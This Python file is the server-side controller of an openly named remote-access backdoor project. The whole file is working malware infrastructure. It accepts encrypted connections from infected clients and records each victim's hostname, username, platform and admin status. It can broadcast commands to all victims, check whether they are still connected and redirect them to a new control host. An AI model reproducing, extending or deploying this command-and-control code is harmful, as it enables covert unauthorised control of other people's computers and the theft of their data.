"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import logging
import socket
import sys
import time
import traceback
from threading import Thread

from src.encrypted_socket import EncryptedSocket
from src.diffie_hellman import DiffieHellman
from src import helper, errors
from src.definitions.commands import *

from src.logger import LOGGER_ID


class Server:
    def __init__(self, port):
        self.logger = logging.getLogger(LOGGER_ID)

        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.listener = socket.socket()

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            self.logger.error(f"Error creating socket {e}")
            sys.exit(0)

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error as e:
                self.logger.warning(f"Error binding socket {e}\nRetrying...")
                time.sleep(3)
                bind()

        bind()

        self.logger.info(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    _socket, address = self.listener.accept()
                    _socket.setblocking(True)

                    dh = DiffieHellman()

                    # send the public key first
                    _socket.send(str(dh.pub_key).encode())

                    self.logger.debug(f"send pub key: {dh.pub_key}")

                    _msg = _socket.recv(1024)

                    self.logger.debug(f"recv first msg (usually pub key): {_msg}")

                    try:
                        if _msg and _msg.decode().isdigit():
                            pub_key = int(_msg.decode())
                        else:
                            self.logger.warning(f"Received unexpected data from: {address[0]}:{address[1]}")
                            _socket.close()
                            continue
                    except UnicodeDecodeError:
                        self.logger.error(f"Received invalid byte data from {address[0]}:{address[1]}")
                        _socket.close()
                        continue

                    try:
                        dh.set_shared_key(pub_key)
                    except Exception as e:
                        self.logger.error(e)
                        _socket.close()
                        continue

                    es = EncryptedSocket(_socket, dh.key)

                    es.send_json(CLIENT_INFO)

                    try:
                        response = es.recv_json()
                    except Exception as e:
                        self.logger.error(f"Error from {address[0]}:{address[1]}: {e}")
                        _socket.close()
                        continue

                    if response["key"] != SUCCESS:
                        self.logger.error(f"Unexpected value received from: {address[0]}:{address[1]}")
                        _socket.close()
                        continue

                    address = {**{"ip": address[0], "port": address[1]}, **response["value"], **{"connected": True},
                               **{"aes_key": dh.key}}

                    del dh

                    if es.socket in self.connections:
                        self.addresses[self.connections.index(es.socket)] = address
                    else:
                        self.connections.append(es.socket)
                        self.addresses.append(address)

                    self.logger.info(
                        f"Connection {len(self.connections)} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                except socket.error as err:
                    self.logger.error(f"Error accepting connection: {err}")
                    continue
                except Exception:
                    self.logger.error(f"Error occurred in listener: {traceback.format_exc()}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _socket in self.active_connections():
                key = self.addresses[self.connections.index(_socket)]["aes_key"]
                es = EncryptedSocket(_socket, key)

                try:
                    es.send_json(CLIENT_EXIT)
                    es.socket.close()
                except socket.error:
                    pass
        else:
            self.logger.warning("No connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []

    # either close with by index or a socket
    def close_one(self, index=-1, sck=None):
        if index == -1:
            if sck is None:
                self.logger.error("Invalid use of function")
                return

            index = self.connections.index(sck) + 1

        try:
            es = self.select(index)
        except errors.ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return

        try:
            es.send_json(CLIENT_EXIT)
            es.socket.close()
        except socket.error:
            pass

        self.addresses[self.connections.index(es.socket)]["connected"] = False

    def refresh(self):
        for i, _socket in enumerate(self.active_connections()):
            close_conn = False

            k = self.addresses[self.connections.index(_socket)]["aes_key"]
            es = EncryptedSocket(_socket, k)

            try:
                es.send_json(CLIENT_HEARTBEAT)

                if es.recv_json()["key"] != SUCCESS:
                    close_conn = True
            except Exception:
                close_conn = True

            if close_conn:
                self.logger.warning(f"Connection {i + 1} disconnected")
                # close conn, but don't send the close signal, so it can restart
                es.socket.close()
                self.addresses[self.connections.index(es.socket)]["connected"] = False

    def get_address(self, _socket):
        return self.addresses[self.connections.index(_socket)]

    def list(self, inactive=False):
        addresses = []
        # add ID
        for i, address in enumerate(self.addresses):
            if (inactive and not address["connected"]) or (not inactive and address["connected"]):
                address = {**{"index": str(i + 1)}, **address}
                addresses.append(address)

        if len(addresses) > 0:
            info = "\n"
            for key in addresses[0]:
                if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                    info += f"{helper.center(str(addresses[0][key]), str(key))}{4 * ' '}"

            info += "\n"

            for i, address in enumerate(addresses):
                for key in address:
                    if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                        info += f"{helper.center(key, address[key])}{4 * ' '}"

                if i < len(addresses) - 1:
                    info += "\n"

            return info
        else:
            _str = "inactive" if inactive else "active"

            self.logger.warning(f"No {_str} connections")
            return ""

    # connection id should be actual index + 1
    def select(self, connection_id):
        try:
            connection_id = int(connection_id)

            if connection_id < 1:
                raise Exception

            _socket = self.connections[connection_id - 1]

            if not self.addresses[connection_id - 1]["connected"]:
                raise Exception

        except Exception:
            raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")

        return EncryptedSocket(_socket, self.addresses[connection_id - 1]["aes_key"])

    def send_all_connections(self, key, value, recv=False, recvall=False):
        if self.num_active_connections() > 0:
            for i, _socket in enumerate(self.active_connections()):

                es = EncryptedSocket(_socket, self.addresses[i]["aes_key"])

                try:
                    es.send_json(key, value)
                except socket.error:
                    continue

                output = ""

                if recvall:
                    data = es.recv_json()

                    buffer = data["value"]["buffer"]

                    output = es.recvall(buffer).decode()
                elif recv:
                    output = es.recv_json()["value"]

                if output:
                    _info = self.addresses[i]
                    print(f"Response from connection {str(i + 1)} at {_info['ip']}:{_info['port']} \n{output}")
        else:
            self.logger.warning("No active connections")

    def active_connections(self):
        conns = []

        for i, address in enumerate(self.addresses):
            if address["connected"]:
                conns.append(self.connections[i])

        return conns

    def num_active_connections(self):
        count = 0

        for address in self.addresses:
            if address["connected"]:
                count += 1

        return count

    def change_host(self, host, port):
        if not port.isdigit():
            self.logger.error(f"Port {port} must be an integer")
            return

        if self.num_active_connections() > 0:
            for i, _socket in enumerate(self.active_connections()):

                es = EncryptedSocket(_socket, self.addresses[i]["aes_key"])

                try:
                    es.send_json(CLIENT_CHANGE_HOST, {"host": host, "port": port})
                    es.socket.close()
                except socket.error:
                    continue

                self.addresses[self.connections.index(es.socket)]["connected"] = False
        else:
            self.logger.warning("No active connections")

    def close(self):
        for _socket in self.active_connections():
            try:
                _socket.close()
            except Exception:
                pass
